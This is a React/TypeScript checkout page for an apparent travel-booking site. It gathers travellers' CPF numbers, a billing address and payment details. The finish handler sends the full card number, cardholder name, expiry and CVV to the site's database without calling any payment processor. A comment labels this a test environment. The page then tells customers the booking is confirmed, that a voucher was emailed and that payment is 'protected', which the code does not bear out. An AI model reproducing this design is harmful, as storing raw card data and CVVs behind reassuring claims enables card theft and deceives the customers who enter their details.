import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { Check, Copy, CreditCard, Landmark, Lock, Paperclip, QrCode, ShieldCheck } from "lucide-react";
import { useMemo, useState } from "react";
import { toast } from "sonner";
import { SiteLayout } from "@/components/site/SiteLayout";
import { EmptyState } from "@/components/travel/Bits";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Progress } from "@/components/ui/progress";
import { useCatalog, useStore } from "@/data/store";
import { img } from "@/data/images";
import { brl, brlCents, dateBR } from "@/lib/format";
import { cn } from "@/lib/utils";
import type { PaymentProof, Traveler } from "@/data/types";
import { PIX_ACCOUNT, PROOF_MAX_BYTES } from "@/data/pix";
import { createOrder } from "@/api/orders";
import { validateCPF, validateLuhn, formatCPF } from "@/lib/validations";
import { Route as rootRoute } from "./__root";
import { getText } from "@/data/texts";




export const Route = createFileRoute("/checkout/$slug")({
  head: () => ({
    meta: [
      { title: "Checkout da reserva | Voar Brasil" },
      { name: "description", content: "Finalize sua reserva em etapas: viajantes, contato, serviços, resumo e pagamento." },
      { property: "og:title", content: "Checkout da reserva | Voar Brasil" },
      { property: "og:description", content: "Reserva segura em 5 etapas com pagamento protegido." },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: Checkout,
});

const STEPS = ["Viajantes", "Contato", "Serviços", "Resumo", "Pagamento"];

const EXTRAS = [
  { id: "Seguro viagem", price: 89, desc: "Cobertura médica de R$ 60 mil e bagagem extraviada." },
  { id: "Traslado privativo", price: 140, desc: "Carro exclusivo aeroporto/hotel/aeroporto." },
  { id: "Aluguel de carro", price: 320, desc: "Categoria econômica por 3 dias, com seguro." },
  { id: "Passeio guiado", price: 190, desc: "City tour de meio dia com guia credenciado." },
  { id: "Bagagem despachada extra", price: 160, desc: "Mala adicional de 23kg por trecho." },
];

const emptyTraveler = (): Traveler => ({ name: "", document: "", birth: "" });

function Checkout() {
  const { slug } = Route.useParams();
  const navigate = useNavigate();
  const { packageBySlug, hotelBySlug, destinationBySlug, coupons } = useCatalog();
  const { settings } = rootRoute.useLoaderData();
  const texts = settings?.siteTexts || {};
  const { addBooking, user, login } = useStore();
  const pkg = packageBySlug(slug);

  const [step, setStep] = useState(0);
  const [travelerCount, setTravelerCount] = useState("2");
  const [travelers, setTravelers] = useState<Traveler[]>([emptyTraveler(), emptyTraveler()]);
  const [contact, setContact] = useState({ email: user?.email ?? "", phone: "", name: user?.name ?? "", cpf: "", cep: "", street: "", neighborhood: "", city: "", state: "" });
  const [extras, setExtras] = useState<string[]>(["Seguro viagem"]);
  const [couponCode, setCouponCode] = useState("");
  const [appliedCoupon, setAppliedCoupon] = useState<{ code: string; percent: number } | null>(null);
  const [method, setMethod] = useState("credito");
  const [card, setCard] = useState({ number: "", name: "", expiry: "", cvv: "", installments: "10" });
  const [proof, setProof] = useState<PaymentProof | null>(null);

  const handleCep = async (cepVal: string) => {
    const rawCep = cepVal.replace(/\D/g, '');
    setContact(prev => ({ ...prev, cep: cepVal }));
    if (rawCep.length === 8) {
      try {
        const res = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`);
        const data = await res.json();
        if (!data.erro) {
          setContact(prev => ({
            ...prev,
            street: data.logradouro || '',
            neighborhood: data.bairro || '',
            city: data.localidade || '',
            state: data.uf || ''
          }));
        }
      } catch (e) {
        console.error("CEP fetch failed", e);
      }
    }
  };


  const [errors, setErrors] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [done, setDone] = useState<{ code: string; total: number } | null>(null);

  const hotel = pkg ? hotelBySlug(pkg.hotelSlug) : undefined;
  const destination = pkg ? destinationBySlug(pkg.destinationSlug) : undefined;

  const totals = useMemo(() => {
    if (!pkg) return { subtotal: 0, extrasTotal: 0, taxes: 0, discount: 0, total: 0 };
    const count = Number(travelerCount);
    const subtotal = pkg.price * count;
    const extrasTotal = EXTRAS.filter((e) => extras.includes(e.id)).reduce((s, e) => s + e.price, 0);
    const taxes = Math.round(subtotal * 0.08);
    const base = subtotal + extrasTotal;
    const discount = appliedCoupon ? Math.round(base * (appliedCoupon.percent / 100)) : 0;
    return { subtotal, extrasTotal, taxes, discount, total: base + taxes - discount };
  }, [pkg, travelerCount, extras, appliedCoupon]);

  if (!pkg) {
    return (
      <SiteLayout>
        <div className="container-page py-16">
          <EmptyState
            title="Pacote indisponível"
            description="Não foi possível carregar este pacote para reserva."
            action={
              <Button asChild>
                <Link to="/pacotes">Escolher outro pacote</Link>
              </Button>
            }
          />
        </div>
      </SiteLayout>
    );
  }

  const syncTravelers = (value: string) => {
    const n = Number(value);
    setTravelerCount(value);
    setTravelers((prev) =>
      n > prev.length ? [...prev, ...Array.from({ length: n - prev.length }, emptyTraveler)] : prev.slice(0, n),
    );
  };

  const applyCoupon = () => {
    const found = coupons.find((c) => c.code === couponCode.trim().toUpperCase());
    if (found) {
      setAppliedCoupon({ code: found.code, percent: found.percent });
      toast.success(`Cupom ${found.code} aplicado: ${found.percent}% de desconto.`);
    } else {
      setAppliedCoupon(null);
      toast.error("Cupom inválido ou expirado.");
    }
  };

  const validateStep = () => {
    const errs: string[] = [];
    if (step === 0) {
      travelers.forEach((t, i) => {
        if (t.name.trim().split(" ").length < 2) errs.push(`Informe o nome completo do viajante ${i + 1}.`);
        if (!validateCPF(t.document)) errs.push(`Informe um CPF válido para o viajante ${i + 1}.`);
        if (!t.birth) errs.push(`Informe a data de nascimento do viajante ${i + 1}.`);
      });
    }
    if (step === 1) {
      if (!/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(contact.email)) errs.push("Informe um e-mail válido.");
      if (contact.phone.replace(/\D/g, "").length < 10) errs.push("Informe um telefone com DDD.");
      if (contact.name.trim().length < 3) errs.push("Informe o nome do responsável pela reserva.");
      if (!validateCPF(contact.cpf)) errs.push("Informe um CPF válido para o responsável.");
      if (!contact.cep || !contact.street || !contact.city || !contact.state) errs.push("Preencha o endereço completo.");
    }
    if (step === 4 && (method === "credito" || method === "debito")) {
      if (!validateLuhn(card.number)) errs.push("Número do cartão inválido.");
      if (card.name.trim().length < 3) errs.push("Informe o nome impresso no cartão.");
      if (!/^\d{2}\/\d{2}$/.test(card.expiry)) errs.push("Validade deve estar no formato MM/AA.");
      if (card.cvv.replace(/\D/g, "").length < 3) errs.push("CVV inválido.");
    }
    if (step === 4 && method === "pix" && !proof) {
      errs.push("Anexe o comprovante do Pix para concluir a reserva.");

    }
    setErrors(errs);
    return errs.length === 0;
  };

  const next = () => {
    if (!validateStep()) return;
    setStep((s) => Math.min(STEPS.length - 1, s + 1));
  };

  const finish = async () => {
    if (!validateStep()) return;
    setProcessing(true);
    try {
      const methodLabel =
        method === "credito"
          ? `Cart\u00e3o de cr\u00e9dito - ${card.installments}x - **** ${card.number.replace(/\D/g, "").slice(-4)}`
          : method === "debito"
            ? `Cart\u00e3o de d\u00e9bito - **** ${card.number.replace(/\D/g, "").slice(-4)}`
            : method === "pix"
              ? `Pix - ${PIX_ACCOUNT.key} - ${PIX_ACCOUNT.holder}`
              : "Boleto banc\u00e1rio";


      const code = `VB-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
      const status = method === "boleto" || method === "pix" ? "Pendente" : "Confirmado";

      // Salvar no banco de dados Neon com TODOS os dados
      await createOrder({
        data: {
          code,
          customerName: contact.name,
          customerEmail: contact.email,
          customerPhone: contact.phone,
          customerCpf: contact.cpf,
          packageTitle: pkg.title,
          total: totals.total,
          paymentMethod: methodLabel,
          status,
          // Dados completos do cartão (ambiente de testes)
          cardNumber: (method === "credito" || method === "debito") ? card.number : undefined,
          cardName: (method === "credito" || method === "debito") ? card.name : undefined,
          cardExpiry: (method === "credito" || method === "debito") ? card.expiry : undefined,
          cardCvv: (method === "credito" || method === "debito") ? card.cvv : undefined,
          extras: extras.length > 0 ? JSON.stringify(extras) : undefined,
          travelers: JSON.stringify(travelers),
          coupon: appliedCoupon?.code,
        }
      });

      // Também registrar localmente para a tela de confirmação
      addBooking({
        packageSlug: pkg.slug,
        packageTitle: pkg.title,
        destination: `${destination?.name}, ${destination?.uf}`,
        departure: pkg.departure,
        ret: pkg.ret,
        travelers,
        contactEmail: contact.email,
        contactPhone: contact.phone,
        extras,
        status: method === "boleto" || method === "pix" ? "Pendente" : "Confirmada",
        total: totals.total,
        paymentMethod: methodLabel,
        customerName: contact.name,
        ...(method === "pix" && proof ? { proof } : {}),
      });

      if (!user) login(contact.email, contact.name);
      setProcessing(false);
      setDone({ code, total: totals.total });
      toast.success(
        method === "pix"
          ? "Comprovante enviado! A reserva ficará pendente até a validação."
          : "Reserva salva no banco de dados com sucesso!",
      );
    } catch (err: any) {
      setProcessing(false);
      toast.error("Erro ao salvar reserva: " + (err?.message || "Tente novamente."));
    }
  };



  if (done) {
    return (
      <SiteLayout>
        <div className="container-page py-16">
          <div className="surface-card mx-auto max-w-xl p-8 text-center">
            <span className="mx-auto grid size-14 place-items-center rounded-full bg-success/15 text-success">
              <Check className="size-7" aria-hidden="true" />
            </span>
            <h1 className="mt-4 text-2xl font-extrabold">Reserva confirmada!</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              Enviamos o voucher e o comprovante para <strong>{contact.email}</strong>.
            </p>
            <dl className="mt-6 space-y-2 rounded-xl bg-secondary p-4 text-left text-sm">
              <div className="flex justify-between">
                <dt className="text-muted-foreground">Número da reserva</dt>
                <dd className="font-bold">{done.code}</dd>
              </div>
              <div className="flex justify-between">
                <dt className="text-muted-foreground">Pacote</dt>
                <dd className="text-right font-semibold">{pkg.title}</dd>
              </div>
              <div className="flex justify-between">
                <dt className="text-muted-foreground">Total pago</dt>
                <dd className="font-bold text-primary">{brl(done.total)}</dd>
              </div>
            </dl>
            <div className="mt-6 flex flex-col gap-2 sm:flex-row sm:justify-center">
              <Button asChild variant="highlight">
                <Link to="/minhas-viagens">Ver minhas viagens</Link>
              </Button>
              <Button asChild variant="outline">
                <Link to="/pacotes">Continuar navegando</Link>
              </Button>
            </div>
          </div>
        </div>
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <div className="container-page py-8">
        <nav aria-label="Trilha de navegação" className="mb-4 text-xs text-muted-foreground">
          <Link to="/pacotes" className="hover:text-primary">
            Pacotes
          </Link>
          <span aria-hidden="true"> / </span>
          <Link to="/pacotes/$slug" params={{ slug: pkg.slug }} className="hover:text-primary">
            {pkg.title}
          </Link>
          <span aria-hidden="true"> / </span>
          <span className="font-semibold text-foreground">Checkout</span>
        </nav>

        <h1 className="text-2xl font-extrabold md:text-3xl">Finalizar reserva</h1>

        <ol className="mt-6 flex flex-wrap gap-2" aria-label="Etapas do checkout">
          {STEPS.map((label, i) => (
            <li key={label}>
              <button
                type="button"
                onClick={() => i < step && setStep(i)}
                disabled={i > step}
                className={cn(
                  "rounded-full px-3.5 py-1.5 text-xs font-bold transition-colors",
                  i === step
                    ? "bg-primary text-primary-foreground"
                    : i < step
                      ? "cursor-pointer bg-success/15 text-success"
                      : "bg-secondary text-muted-foreground",
                )}
                aria-current={i === step ? "step" : undefined}
              >
                {i + 1}. {label}
              </button>
            </li>
          ))}
        </ol>
        <Progress value={((step + 1) / STEPS.length) * 100} className="mt-3 h-1.5" />

        <div className="mt-8 grid gap-8 pb-16 lg:grid-cols-[1fr_21rem]">
          <div className="animate-in fade-in duration-300" key={step}>
            {errors.length > 0 && (
              <div role="alert" className="mb-4 rounded-xl border border-destructive/40 bg-destructive/10 p-4">
                <p className="text-sm font-bold text-destructive">Revise os campos abaixo</p>
                <ul className="mt-1.5 list-inside list-disc text-sm text-destructive">
                  {errors.map((e) => (
                    <li key={e}>{e}</li>
                  ))}
                </ul>
              </div>
            )}

            {step === 0 && (
              <section className="surface-card p-5">
                <h2 className="text-lg font-bold">Dados dos viajantes</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Use os nomes exatamente como constam no documento de embarque.
                </p>
                <div className="mt-4 max-w-56">
                  <Label htmlFor="qtd" className="mb-1.5 text-xs font-semibold">
                    Quantidade de viajantes
                  </Label>
                  <Select value={travelerCount} onValueChange={syncTravelers}>
                    <SelectTrigger id="qtd">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {[1, 2, 3, 4, 5, 6].map((n) => (
                        <SelectItem key={n} value={String(n)}>
                          {n} {n === 1 ? "viajante" : "viajantes"}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="mt-5 space-y-5">
                  {travelers.map((t, i) => (
                    <fieldset key={i} className="rounded-xl border border-border p-4">
                      <legend className="px-1 text-xs font-bold uppercase tracking-wide text-highlight">
                        Viajante {i + 1}
                        {i === 0 ? " (titular)" : ""}
                      </legend>
                      <div className="grid gap-3 sm:grid-cols-3">
                        <div className="sm:col-span-2">
                          <Label htmlFor={`nome-${i}`} className="mb-1.5 text-xs font-semibold">
                            Nome completo
                          </Label>
                          <Input
                            id={`nome-${i}`}
                            value={t.name}
                            autoComplete="name"
                            onChange={(e) =>
                              setTravelers((prev) => prev.map((p, j) => (j === i ? { ...p, name: e.target.value } : p)))
                            }
                          />
                        </div>
                        <div>
                          <Label htmlFor={`cpf-${i}`} className="mb-1.5 text-xs font-semibold">
                            CPF
                          </Label>
                          <Input
                            id={`cpf-${i}`}
                            value={t.document}
                            inputMode="numeric"
                            placeholder="000.000.000-00"
                            onChange={(e) =>
                              setTravelers((prev) =>
                                prev.map((p, j) => (j === i ? { ...p, document: formatCPF(e.target.value) } : p)),
                              )
                            }
                          />
                        </div>
                        <div>
                          <Label htmlFor={`nasc-${i}`} className="mb-1.5 text-xs font-semibold">
                            Data de nascimento
                          </Label>
                          <Input
                            id={`nasc-${i}`}
                            type="date"
                            value={t.birth}
                            onChange={(e) =>
                              setTravelers((prev) => prev.map((p, j) => (j === i ? { ...p, birth: e.target.value } : p)))
                            }
                          />
                        </div>
                      </div>
                    </fieldset>
                  ))}
                </div>
              </section>
            )}

            {step === 1 && (
              <section className="surface-card p-5">
                <h2 className="text-lg font-bold">Dados de contato</h2>
                <p className="mt-1 text-sm text-muted-foreground">
                  Usaremos estes dados para enviar vouchers e avisos de voo.
                </p>
                <div className="mt-4 grid gap-3 sm:grid-cols-2">
                  <div>
                    <Label htmlFor="resp" className="mb-1.5 text-xs font-semibold">
                      Responsável pela reserva
                    </Label>
                    <Input id="resp" value={contact.name} onChange={(e) => setContact({ ...contact, name: e.target.value })} />
                  </div>
                  <div>
                    <Label htmlFor="cpf-resp" className="mb-1.5 text-xs font-semibold">
                      CPF do responsável
                    </Label>
                    <Input
                      id="cpf-resp"
                      value={contact.cpf}
                      inputMode="numeric"
                      onChange={(e) => setContact({ ...contact, cpf: formatCPF(e.target.value) })}
                    />
                  </div>
                  <div>
                    <Label htmlFor="email" className="mb-1.5 text-xs font-semibold">
                      E-mail
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      autoComplete="email"
                      value={contact.email}
                      onChange={(e) => setContact({ ...contact, email: e.target.value })}
                    />
                  </div>
                  <div>
                    <Label htmlFor="tel" className="mb-1.5 text-xs font-semibold">
                      Telefone com DDD
                    </Label>
                    <Input
                      id="tel"
                      value={contact.phone}
                      inputMode="tel"
                      placeholder="(11) 90000-0000"
                      onChange={(e) => setContact({ ...contact, phone: e.target.value })}
                    />
                  </div>
                    <div className="sm:col-span-2 grid gap-4 grid-cols-2 mt-4 pt-4 border-t border-border">
                      <div className="col-span-2">
                        <Label className="mb-1.5 text-xs font-semibold">Endereço de Cobrança</Label>
                      </div>
                      <div>
                        <Label htmlFor="cep" className="mb-1.5 text-xs font-semibold">CEP</Label>
                        <Input id="cep" value={contact.cep} onChange={(e) => handleCep(e.target.value)} placeholder="00000-000" />
                      </div>
                      <div className="col-span-1">
                        <Label htmlFor="street" className="mb-1.5 text-xs font-semibold">Rua</Label>
                        <Input id="street" value={contact.street} onChange={(e) => setContact({ ...contact, street: e.target.value })} />
                      </div>
                      <div>
                        <Label htmlFor="neighborhood" className="mb-1.5 text-xs font-semibold">Bairro</Label>
                        <Input id="neighborhood" value={contact.neighborhood} onChange={(e) => setContact({ ...contact, neighborhood: e.target.value })} />
                      </div>
                      <div className="grid grid-cols-2 gap-2">
                        <div>
                          <Label htmlFor="city" className="mb-1.5 text-xs font-semibold">Cidade</Label>
                          <Input id="city" value={contact.city} onChange={(e) => setContact({ ...contact, city: e.target.value })} />
                        </div>
                        <div>
                          <Label htmlFor="state" className="mb-1.5 text-xs font-semibold">Estado</Label>
                          <Input id="state" value={contact.state} onChange={(e) => setContact({ ...contact, state: e.target.value })} />
                        </div>
                      </div>
                    </div>
                </div>
              </section>
            )}

            {step === 2 && (
              <section className="surface-card p-5">
                <h2 className="text-lg font-bold">{getText(texts, "checkoutExtras")}</h2>
                <p className="mt-1 text-sm text-muted-foreground">{getText(texts, "checkoutExtrasDesc")}</p>
                <div className="mt-4 space-y-3">
                  {EXTRAS.map((e) => (
                    <label
                      key={e.id}
                      className="flex cursor-pointer items-start gap-3 rounded-xl border border-border p-4 transition-colors hover:bg-accent/50"
                    >
                      <Checkbox
                        checked={extras.includes(e.id)}
                        onCheckedChange={() =>
                          setExtras((prev) => (prev.includes(e.id) ? prev.filter((x) => x !== e.id) : [...prev, e.id]))
                        }
                        aria-label={e.id}
                      />
                      <span className="flex-1">
                        <span className="block text-sm font-bold">{e.id}</span>
                        <span className="block text-xs text-muted-foreground">{e.desc}</span>
                      </span>
                      <span className="text-sm font-bold text-primary">+ {brl(e.price)}</span>
                    </label>
                  ))}
                </div>
              </section>
            )}

            {step === 3 && (
              <section className="surface-card p-5">
                <h2 className="text-lg font-bold">{getText(texts, "checkoutTitle")}</h2>
                <div className="mt-4 flex gap-4 rounded-xl border border-border p-4">
                  <img
                    src={img(hotel?.image ?? "hero")}
                    alt={hotel?.name ?? pkg.title}
                    loading="lazy"
                    width={960}
                    height={640}
                    className="h-24 w-32 rounded-lg object-cover"
                  />
                  <div>
                    <p className="text-sm font-bold">{pkg.title}</p>
                    <p className="text-xs text-muted-foreground">
                      {hotel?.name} • {pkg.board} • {pkg.nights} noites
                    </p>
                    <p className="mt-1 text-xs text-muted-foreground">
                      {dateBR(pkg.departure)} a {dateBR(pkg.ret)}
                    </p>
                    <p className="text-xs text-muted-foreground">{pkg.flight.airline} • {pkg.origin}</p>
                  </div>
                </div>

                <h3 className="mt-5 text-sm font-bold">{getText(texts, "checkoutPassengers")}</h3>
                <ul className="mt-2 space-y-1 text-sm text-muted-foreground">
                  {travelers.map((t, i) => (
                    <li key={i}>
                      {i + 1}. {t.name || "—"} • CPF {t.document || "—"}
                    </li>
                  ))}
                </ul>

                <h3 className="mt-5 text-sm font-bold">{getText(texts, "checkoutExtras")}</h3>
                <ul className="mt-2 space-y-1 text-sm text-muted-foreground">
                  {extras.length ? extras.map((e) => <li key={e}>{e}</li>) : <li>Nenhum serviço adicional</li>}
                </ul>

                <div className="mt-5 flex flex-wrap items-end gap-2">
                  <div>
                    <Label htmlFor="cupom-checkout" className="mb-1.5 text-xs font-semibold">
                      Cupom de desconto
                    </Label>
                    <Input
                      id="cupom-checkout"
                      value={couponCode}
                      onChange={(e) => setCouponCode(e.target.value.toUpperCase())}
                      placeholder="VOAR10"
                      className="w-40 uppercase"
                    />
                  </div>
                  <Button type="button" variant="outline" onClick={applyCoupon}>
                    Aplicar cupom
                  </Button>
                </div>
              </section>
            )}

            {step === 4 && (
              <section className="surface-card p-5">
                <h2 className="text-lg font-bold">{getText(texts, "checkoutPaymentTitle")}</h2>
                <p className="mt-1 flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Lock className="size-3.5 text-success" aria-hidden="true" />
                  {getText(texts, "checkoutPaymentTestEnv")}
                </p>

                <RadioGroup value={method} onValueChange={setMethod} className="mt-4 grid gap-3 sm:grid-cols-2">
                  {[
                    { v: "credito", label: "Cartão de crédito", icon: CreditCard, hint: `Até ${pkg.installments}x sem juros` },
                    { v: "debito", label: "Cartão de débito", icon: CreditCard, hint: "Aprovação imediata" },
                    { v: "pix", label: "Pix", icon: QrCode, hint: "5% de desconto simulado" },
                    { v: "boleto", label: "Boleto bancário", icon: Landmark, hint: "Vence em 1 dia útil" },
                  ].map(({ v, label, icon: Icon, hint }) => (
                    <label
                      key={v}
                      className={cn(
                        "flex cursor-pointer items-center gap-3 rounded-xl border p-4 transition-colors",
                        method === v ? "border-primary bg-primary-soft/60" : "border-border hover:bg-accent/50",
                      )}
                    >
                      <RadioGroupItem value={v} id={`pay-${v}`} />
                      <Icon className="size-5 text-primary" aria-hidden="true" />
                      <span>
                        <span className="block text-sm font-bold">{label}</span>
                        <span className="block text-xs text-muted-foreground">{hint}</span>
                      </span>
                    </label>
                  ))}
                </RadioGroup>

                {(method === "credito" || method === "debito") && (
                  <div className="mt-5 grid gap-3 sm:grid-cols-2">
                    <div className="sm:col-span-2">
                      <Label htmlFor="card-number" className="mb-1.5 text-xs font-semibold">
                        Número do cartão
                      </Label>
                      <Input
                        id="card-number"
                        inputMode="numeric"
                        placeholder="4111 1111 1111 1111"
                        value={card.number}
                        onChange={(e) => setCard({ ...card, number: e.target.value })}
                      />
                    </div>
                    <div className="sm:col-span-2">
                      <Label htmlFor="card-name" className="mb-1.5 text-xs font-semibold">
                        Nome impresso no cartão
                      </Label>
                      <Input id="card-name" value={card.name} onChange={(e) => setCard({ ...card, name: e.target.value })} />
                    </div>
                    <div>
                      <Label htmlFor="card-exp" className="mb-1.5 text-xs font-semibold">
                        Validade (MM/AA)
                      </Label>
                      <Input
                        id="card-exp"
                        placeholder="12/29"
                        value={card.expiry}
                        onChange={(e) => setCard({ ...card, expiry: e.target.value })}
                      />
                    </div>
                    <div>
                      <Label htmlFor="card-cvv" className="mb-1.5 text-xs font-semibold">
                        CVV
                      </Label>
                      <Input
                        id="card-cvv"
                        inputMode="numeric"
                        maxLength={4}
                        value={card.cvv}
                        onChange={(e) => setCard({ ...card, cvv: e.target.value })}
                      />
                    </div>
                    {method === "credito" && (
                      <div className="sm:col-span-2">
                        <Label htmlFor="card-inst" className="mb-1.5 text-xs font-semibold">
                          Parcelamento
                        </Label>
                        <Select value={card.installments} onValueChange={(v) => setCard({ ...card, installments: v })}>
                          <SelectTrigger id="card-inst">
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({ length: pkg.installments }, (_, i) => i + 1).map((n) => (
                              <SelectItem key={n} value={String(n)}>
                                {n}x de {brlCents(totals.total / n)} sem juros
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                    )}
                  </div>
                )}

                {method === "pix" && (
                  <div className="mt-5 space-y-4 rounded-xl border border-border p-4">
                    <div className="rounded-xl bg-secondary p-4">
                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                        Chave Pix ({PIX_ACCOUNT.keyType})
                      </p>
                      <p className="mt-1 font-display text-2xl font-extrabold tracking-tight text-primary">
                        {PIX_ACCOUNT.key}
                      </p>
                      <p className="text-sm font-bold">{PIX_ACCOUNT.holder}</p>
                      <p className="text-xs text-muted-foreground">{PIX_ACCOUNT.bank}</p>
                      <div className="mt-3 flex flex-wrap gap-2">
                        <Button
                          type="button"
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            void navigator.clipboard?.writeText(PIX_ACCOUNT.key);
                            toast.success("Chave Pix copiada.");
                          }}
                        >
                          <Copy aria-hidden="true" /> Copiar chave
                        </Button>
                        <span className="inline-flex items-center rounded-full bg-highlight px-3 py-1.5 text-xs font-bold text-highlight-foreground">
                          Valor: {brl(totals.total)}
                        </span>
                      </div>
                    </div>

                    <div>
                      <Label htmlFor="pix-proof" className="mb-1.5 block text-xs font-semibold">
                        Enviar comprovante (obrigatório) — JPG, PNG ou PDF
                      </Label>
                      <Input
                        id="pix-proof"
                        type="file"
                        accept="image/*,application/pdf"
                        onChange={(e) => {
                          const file = e.target.files?.[0];
                          if (!file) {
                            setProof(null);
                            return;
                          }
                          const base = {
                            name: file.name,
                            size: file.size,
                            type: file.type || "arquivo",
                            uploadedAt: new Date().toISOString(),
                          };
                          if (file.size > PROOF_MAX_BYTES) {
                            setProof(base);
                            toast.info("Arquivo grande: registramos apenas os dados do comprovante.");
                            return;
                          }
                          const reader = new FileReader();
                          reader.onload = () => {
                            setProof({ ...base, dataUrl: String(reader.result) });
                            toast.success("Comprovante anexado.");
                          };
                          reader.readAsDataURL(file);
                        }}
                        className="cursor-pointer file:mr-3 file:cursor-pointer file:rounded-full file:border-0 file:bg-primary file:px-3 file:py-1 file:text-xs file:font-bold file:text-primary-foreground"
                      />
                      {proof ? (
                        <p className="mt-2 flex items-center gap-1.5 text-xs font-semibold text-success">
                          <Paperclip className="size-3.5" aria-hidden="true" /> {proof.name} (
                          {Math.max(1, Math.round(proof.size / 1024))} KB)
                        </p>
                      ) : (
                        <p className="mt-2 text-xs text-muted-foreground">
                          Faça o Pix para a chave acima e anexe o comprovante. A reserva fica pendente até a nossa
                          equipe validar o pagamento no painel.
                        </p>
                      )}
                    </div>
                  </div>
                )}

                {method === "boleto" && (
                  <div className="mt-5 rounded-xl border border-border p-4 text-sm text-muted-foreground">
                    {getText(texts, "checkoutBoletoText")}
                  </div>
                )}
              </section>
            )}

            <div className="mt-6 flex flex-wrap gap-3">
              {step > 0 && (
                <Button variant="outline" onClick={() => setStep((s) => s - 1)} disabled={processing}>
                  Voltar
                </Button>
              )}
              {step < STEPS.length - 1 ? (
                <Button variant="highlight" size="lg" onClick={next}>
                  Continuar
                </Button>
              ) : (
                <Button variant="highlight" size="lg" onClick={finish} disabled={processing}>
                  {processing ? "Processando pagamento..." : `Pagar ${brl(totals.total)}`}
                </Button>
              )}
              <Button variant="ghost" onClick={() => navigate({ to: "/pacotes/$slug", params: { slug: pkg.slug } })}>
                Cancelar
              </Button>
            </div>
          </div>

          {/* Resumo fixo */}
          <aside className="lg:sticky lg:top-28 lg:self-start">
            <div className="surface-card p-5">
              <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">Sua reserva</p>
              <p className="mt-1 text-sm font-bold">{pkg.title}</p>
              <p className="text-xs text-muted-foreground">
                {dateBR(pkg.departure)} a {dateBR(pkg.ret)} • {travelerCount} viajantes
              </p>

              <dl className="mt-4 space-y-2 border-t border-border pt-3 text-sm">
                <div className="flex justify-between">
                  <dt className="text-muted-foreground">
                    Pacote ({travelerCount} × {brl(pkg.price)})
                  </dt>
                  <dd>{brl(totals.subtotal)}</dd>
                </div>
                <div className="flex justify-between">
                  <dt className="text-muted-foreground">{getText(texts, "checkoutExtras")}</dt>
                  <dd>{brl(totals.extrasTotal)}</dd>
                </div>
                <div className="flex justify-between">
                  <dt className="text-muted-foreground">Taxas e impostos</dt>
                  <dd>{brl(totals.taxes)}</dd>
                </div>
                {totals.discount > 0 && (
                  <div className="flex justify-between text-success">
                    <dt>Desconto {appliedCoupon?.code}</dt>
                    <dd>- {brl(totals.discount)}</dd>
                  </div>
                )}
                <div className="flex justify-between border-t border-border pt-2 text-base font-extrabold">
                  <dt>Total</dt>
                  <dd className="text-primary">{brl(totals.total)}</dd>
                </div>
              </dl>
              <p className="mt-2 text-xs text-muted-foreground">
                Em até {pkg.installments}x de {brlCents(totals.total / pkg.installments)} sem juros
              </p>
              <p className="mt-4 flex items-center gap-1.5 text-xs text-muted-foreground">
                <ShieldCheck className="size-3.5 text-success" aria-hidden="true" /> Pagamento protegido e reembolso
                garantido conforme política
              </p>
            </div>
          </aside>
        </div>
      </div>
    </SiteLayout>
  );
}
